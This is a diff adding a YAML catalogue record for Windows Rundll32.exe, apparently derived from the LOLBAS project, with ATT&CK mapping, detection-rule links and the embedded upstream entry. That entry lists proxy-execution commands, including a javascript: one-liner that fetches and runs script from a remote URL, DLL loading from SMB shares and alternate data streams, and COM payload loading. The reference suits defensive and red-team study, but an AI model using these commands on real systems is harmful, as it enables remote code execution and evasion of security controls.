@@ -1,0 +1,124 @@
+id: lolbas/T1NCaW5hcmllcy9SdW5kbGwzMi55bWw/RXhlY3V0ZQ/0
+type: binary
+platform: windows
+name: Rundll32.exe
+phases:
+- execution
+capabilities:
+- command-execution
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0
+  upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+  last_synced: '2026-11-13'
+attack_techniques:
+- T1218.011
+opsec:
+  noise: high
+  triggers: Outbount Internet/network connections made from rundll32
+  detection_refs:
+  - https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/network_connection/net_connection_win_rundll32_net_connections.yml
+  - https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml
+  - https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_unusual_network_connection_via_rundll32.toml
+commands:
+- template: rundll32.exe {PATH},EntryPoint
+  comment: First part should be a DLL file (any extension accepted), EntryPoint should be the name of
+    the entry point in the DLL file to execute.
+references:
+- https://lolbas-project.github.io/lolbas/Binaries/Rundll32/
+tags:
+- windows
+- lolbas
+source_data:
+  LOLBAS:
+    raw:
+      name: Rundll32.exe
+      category: Execute
+      privileges: User
+      mitre_id: T1218.011
+      source_file: OSBinaries/Rundll32.yml
+      command_source_index: 0
+      document_utf8: "---\nName: Rundll32.exe\nDescription: Used by Windows to execute dll files\nAuthor:\
+        \ Oddvar Moe\nCreated: 2018-05-25\nCommands:\n  - Command: rundll32.exe {PATH},EntryPoint\n  \
+        \  Description: First part should be a DLL file (any extension accepted), EntryPoint should be\
+        \ the name of the entry point in the DLL file to execute.\n    Usecase: Execute DLL file\n   \
+        \ Category: Execute\n    Privileges: User\n    MitreID: T1218.011\n    OperatingSystem: Windows\
+        \ vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11\n    Tags:\n      - Execute:\
+        \ DLL\n  - Command: rundll32.exe {PATH_SMB:.dll},EntryPoint\n    Description: Execute a DLL from\
+        \ an SMB share. EntryPoint is the name of the entry point in the DLL file to execute.\n    Usecase:\
+        \ Execute DLL from SMB share.\n    Category: Execute\n    Privileges: User\n    MitreID: T1218.011\n\
+        \    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11\n\
+        \    Tags:\n      - Execute: DLL\n      - Execute: Remote\n  - Command: rundll32.exe javascript:\"\
+        \\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:{REMOTEURL}\")\n    Description:\
+        \ Use Rundll32.exe to execute a JavaScript script that calls a remote JavaScript script.\n   \
+        \ Usecase: Execute code from Internet\n    Category: Execute\n    Privileges: User\n    MitreID:\
+        \ T1218.011\n    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10,\
+        \ Windows 11\n    Tags:\n      - Execute: JScript\n  - Command: rundll32 \"{PATH}:ADSDLL.dll\"\
+        ,DllMain\n    Description: Use Rundll32.exe to execute a .DLL file stored in an Alternate Data\
+        \ Stream (ADS).\n    Usecase: Execute code from alternate data stream\n    Category: ADS\n   \
+        \ Privileges: User\n    MitreID: T1564.004\n    OperatingSystem: Windows vista, Windows 7, Windows\
+        \ 8, Windows 8.1, Windows 10, Windows 11\n    Tags:\n      - Execute: DLL\n  - Command: rundll32.exe\
+        \ -sta {CLSID}\n    Description: Use Rundll32.exe to load a registered or hijacked COM Server\
+        \ payload. Also works with ProgID.\n    Usecase: Execute a DLL/EXE COM server payload or ScriptletURL\
+        \ code.\n    Category: Execute\n    Privileges: User\n    MitreID: T1218.011\n    OperatingSystem:\
+        \ Windows 10 (and likely previous versions), Windows 11\n    Tags:\n      - Execute: COM\nFull_Path:\n\
+        \  - Path: C:\\Windows\\System32\\rundll32.exe\n  - Path: C:\\Windows\\SysWOW64\\rundll32.exe\n\
+        Detection:\n  - Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/network_connection/net_connection_win_rundll32_net_connections.yml\n\
+        \  - Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml\n\
+        \  - Elastic: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_unusual_network_connection_via_rundll32.toml\n\
+        \  - IOC: Outbount Internet/network connections made from rundll32\n  - IOC: Suspicious use of\
+        \ cmdline flags such as -sta\nResources:\n  - Link: https://pentestlab.blog/2017/05/23/applocker-bypass-rundll32/\n\
+        \  - Link: https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_7\n  - Link:\
+        \ https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/\n  - Link:\
+        \ https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/\n\
+        \  - Link: https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/\n\
+        \  - Link: https://github.com/sailay1996/expl-bin/blob/master/obfus.md\n  - Link: https://github.com/sailay1996/misc-bin/blob/master/rundll32.md\n\
+        \  - Link: https://nasbench.medium.com/a-deep-dive-into-rundll32-exe-642344b41e90\n  - Link: https://www.cybereason.com/blog/rundll32-the-infamous-proxy-for-executing-malicious-code\n\
+        Acknowledgement:\n  - Person: Casey Smith\n    Handle: '@subtee'\n  - Person: Oddvar Moe\n   \
+        \ Handle: '@oddvarmoe'\n  - Person: Jimmy\n    Handle: '@bohops'\n  - Person: Sailay\n    Handle:\
+        \ '@404death'\n  - Person: Martin Ingesen\n    Handle: '@Mrtn9'\n"
+      document_sha256: sha256:267b9ac4bd25820a87ac36b4a91e8c0ee4e13b04bc2e5f783c4396b240a90aa7
+    upstream_url: https://lolbas-project.github.io/lolbas/Binaries/Rundll32/
+    upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: command-execution
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  attack_techniques:
+  - value: T1218.011
+    provenance:
+      type: upstream
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    LOLBAS: sha256:ae37c7835328afac37bf02aefbe24365d89c45e9676aeefb1f208122e33ae249
